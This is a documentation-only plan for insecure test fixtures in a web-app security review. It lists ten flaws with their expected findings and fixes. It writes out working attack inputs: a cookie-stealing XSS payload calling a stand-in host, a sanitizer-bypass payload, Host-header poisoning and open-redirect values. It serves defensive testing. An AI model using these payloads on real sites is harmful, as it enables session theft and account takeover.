# Insecure fixture plan: secod-web-app-security

Minimal reproducible unsafe cases, one per control family. Documentation-only plan; no
executable code is maintained in this repository.

## F1 — Sink injection via user comment (XSS)

Comment body rendered with `element.innerHTML = comment.body`. Payload
`<img src=x onerror=fetch('//evil?t='+document.cookie)>` executes. Expected finding:
`Do not ship`. Expected fix: text-content rendering or sanitizer pass plus strict CSP.

## F2 — Regex "sanitizer" bypassed by mutation XSS

Custom regex strips `<script>` but payload `<svg><style><a title="</style><img src=x onerror=1>">`
survives into DOM. Expected finding: `Fix before launch`. Expected fix: maintained allowlist
sanitizer (DOMPurify-class) in parsing context equal to render context.

## F3 — Allowlist-only CSP presented as mitigation; nonce reuse

Policy is `script-src cdn.partner.example 'unsafe-inline'`; same nonce emitted for cached pages.
Expected findings: host-allowlist bypassable as XSS mitigation (`Recommended hardening` at best);
reused nonce on cached responses defeats per-request guarantee (`Fix before launch`). Expected
fix: strict policy `script-src 'nonce-{per-request}' 'strict-dynamic'; object-src 'none';
base-uri 'none'` with `Cache-Control: no-store` on nonced documents.

## F4 — Floating third-party loader without SRI decision

Authenticated dashboard loads `https://vendor.example/widget.js` unversioned, no `integrity`,
no owner recorded. Expected finding: inventory gap + integrity decision required; static
versioned resources must carry sha384 + `crossorigin`.

## F5 — Clickjacking and postMessage forgery

Account-settings page has no `frame-ancestors`; global message listener acts on any
`event.data` without origin check. Expected findings: frame protection per route class +
origin-allowlisted schema-validated handler.

## F6 — Wildcard CORS with credentials

API responds `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`.
Expected finding: `Do not ship`. Expected fix: exact origin allowlist, credentials-scoped.

## F7 — Bearer token in localStorage

Auth flow stores JWT and refresh token in `localStorage`. Simulated XSS enumerates storage and
exfiltrates both. Expected finding: `Do not ship` — HttpOnly cookie session or BFF pattern per
RFC 10017.

## F8 — Reset link from Host header

Password-reset email link built from request `Host`. Attacker sends reset request with
`Host: evil.example`, victim receives link on attacker domain. Expected finding:
`Fix before launch`; canonical-origin allowlist resolution.

## F9 — Service worker caches personalized API responses

Root-scope worker caches `/api/me` responses; second user on shared machine receives first
user's profile offline. Expected finding: scope reduction + private-response exclusion.

## F10 — Production source maps published; open redirect; prototype pollution

`app.js.map` reachable in production exposing original source; `/login?next=//evil.example`
redirects verbatim; merge helper recurses `__proto__` from query params. Expected findings:
maps blocked or justified; redirect restricted to relative/allowlisted targets; pollution
hardened.

## Missing-evidence case

Repository defines CSP in middleware but deployment sits behind CDN with unknown header
behavior. Expected status: deployed-header controls `Not verified` until supplied live captures;
construction-quality findings still issued from code.
